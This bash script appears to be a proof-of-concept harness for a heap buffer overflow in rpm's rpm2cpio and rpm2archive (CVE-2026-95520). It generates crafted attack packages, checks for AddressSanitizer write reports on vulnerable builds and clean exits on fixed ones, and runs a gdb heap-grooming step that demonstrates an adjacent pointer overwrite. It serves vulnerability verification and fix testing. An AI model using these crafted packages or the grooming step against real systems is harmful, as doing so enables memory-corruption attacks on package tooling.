#!/usr/bin/env bash
# Replay the real rpm2cpio/rpm2archive consumer evidence for CVE-2026-95520.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
vuln_config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$vuln_config/rpmrc" ] || vuln_config=$root/build-vuln-asan

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

python3 make-attack.py safe.rpm attack.rpm safe-newc.rpm stripped-attack.rpm \
    > make-attack.log || { cat make-attack.log; exit 1; }

run_case() {
    local name=$1 expected=$2 config=$3 binary=$4 package=$5
    local log=$name.log rc
    env RPM_CONFIGDIR="$config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
        "$binary" "$package" >/dev/null 2>"$log"
    rc=$?
    printf '%s\n' "$rc" > "$log.rc"
    if [ "$rc" -eq "$expected" ]; then
        ok "$name rc=$rc"
    else
        bad "$name rc=$rc expected=$expected"
        cat "$log"
    fi
}

run_case vuln-rpm2cpio-attack 134 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2cpio" attack.rpm
run_case vuln-rpm2archive-attack 134 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2archive" attack.rpm
run_case fixed-rpm2cpio-attack 1 "$fixed_config" \
    "$root/build-fixed-asan/tools/rpm2cpio" attack.rpm
run_case fixed-rpm2archive-attack 1 "$fixed_config" \
    "$root/build-fixed-asan/tools/rpm2archive" attack.rpm
run_case vuln-rpm2cpio-safe 0 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2cpio" safe-newc.rpm
run_case fixed-rpm2cpio-safe 0 "$fixed_config" \
    "$root/build-fixed-asan/tools/rpm2cpio" safe-newc.rpm
run_case vuln-rpm2archive-safe 0 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2archive" safe-newc.rpm
run_case fixed-rpm2archive-safe 0 "$fixed_config" \
    "$root/build-fixed-asan/tools/rpm2archive" safe-newc.rpm
run_case vuln-rpm2cpio-stripped-attack 1 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2cpio" stripped-attack.rpm

for log in vuln-rpm2cpio-attack.log vuln-rpm2archive-attack.log; do
    if grep -q 'WRITE of size 64' "$log" && \
       grep -q '0 bytes after 1-byte region' "$log" && \
       grep -q 'iterReadArchiveNext.*rpmfi.cc:2242' "$log"; then
        ok "$log real ASan write"
    else
        bad "$log real ASan write"
    fi
done
for log in fixed-rpm2cpio-attack.log fixed-rpm2archive-attack.log \
            vuln-rpm2cpio-safe.log fixed-rpm2cpio-safe.log \
            vuln-rpm2archive-safe.log fixed-rpm2archive-safe.log \
            vuln-rpm2cpio-stripped-attack.log; do
    if grep -q 'AddressSanitizer' "$log"; then
        bad "$log unexpected ASan report"
    else
        ok "$log ASan-clean"
    fi
done
if grep -q 'Size required (-1)' vuln-rpm2cpio-stripped-attack.log; then
    ok "stripped payload preserves negative"
else
    bad "stripped payload preserves negative"
fi

env RPM_CONFIGDIR="$vuln_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$root/build-vuln-asan/tools/rpm" -qlvp --nodigest attack.rpm \
    > vuln-rpm-qlvp-attack.log 2>&1
rc=$?
printf '%s\n' "$rc" > vuln-rpm-qlvp-attack.log.rc
if [ "$rc" -eq 0 ] && ! grep -q AddressSanitizer vuln-rpm-qlvp-attack.log && \
   grep -q '18446744073709551615' vuln-rpm-qlvp-attack.log; then
    ok "rpm -qlvp is header-only negative"
else
    bad "rpm -qlvp is header-only negative"
fi

gcc -shared -fPIC -O2 -o adjacent.so adjacent.c || exit 1
gdb -q -batch -x layout-groom.gdb "$root/build-vuln-plain/tools/rpm2cpio" \
    > plain-layout-groom.log 2>&1
if python3 check-layout.py plain-layout-groom.log \
    > plain-layout-groom-check.log 2>&1; then
    ok "lab-groomed real-consumer adjacent pointer overwrite"
else
    bad "lab-groomed real-consumer adjacent pointer overwrite"
    cat plain-layout-groom.log
fi

echo "REAL_CONSUMER_PASS=$pass REAL_CONSUMER_FAIL=$fail"
[ "$fail" -eq 0 ]
